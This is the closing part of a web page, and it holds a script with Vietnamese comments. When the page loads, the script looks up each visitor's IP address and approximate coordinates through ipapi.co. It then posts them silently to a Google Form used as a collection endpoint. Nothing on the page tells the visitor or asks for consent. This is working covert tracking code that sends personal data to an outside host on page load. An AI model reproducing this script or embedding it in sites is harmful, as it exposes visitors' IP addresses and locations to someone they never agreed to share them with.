<script>
    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
    const ENTRY_IP = "entry.1588338519";
    const ENTRY_LAT = "entry.791072472";
    const ENTRY_LNG = "entry.1393666541";

    function sendToGoogleForm(ip, lat = "Từ chối/Không hỗ trợ", lng = "Từ chối/Không hỗ trợ") {
        const formData = new FormData();
        formData.append(ENTRY_IP, ip);
        formData.append(ENTRY_LAT, lat);
        formData.append(ENTRY_LNG, lng);

        fetch(FORM_URL, {
            method: "POST",
            mode: "no-cors",
            body: formData
        });
    }

    window.addEventListener("DOMContentLoaded", async () => {
        let userIP = "Không xác định";
        let latFormatted = "Không xác định";
        let lngFormatted = "Không xác định";

        try {
            // Lấy thông tin IP và vị trí ước lượng đồng thời thông qua API
            const response = await fetch("https://ipapi.co/json/");
            const data = await response.json();
            
            userIP = data.ip || "Không xác định";
            
            // Thêm dấu nháy đơn ' ở đầu để ép Google Sheets hiểu đây là text
            if (data.latitude && data.longitude) {
                latFormatted = "'" + data.latitude;
                lngFormatted = "'" + data.longitude;
            }

            // Gửi dữ liệu về form
            sendToGoogleForm(userIP, latFormatted, lngFormatted);
            
        } catch (e) {
            console.log("Lỗi lấy thông tin IP/Vị trí", e);
            // Gửi dữ liệu mặc định nếu lỗi mạng
            sendToGoogleForm(userIP);
        }
    });
</script>
</body>
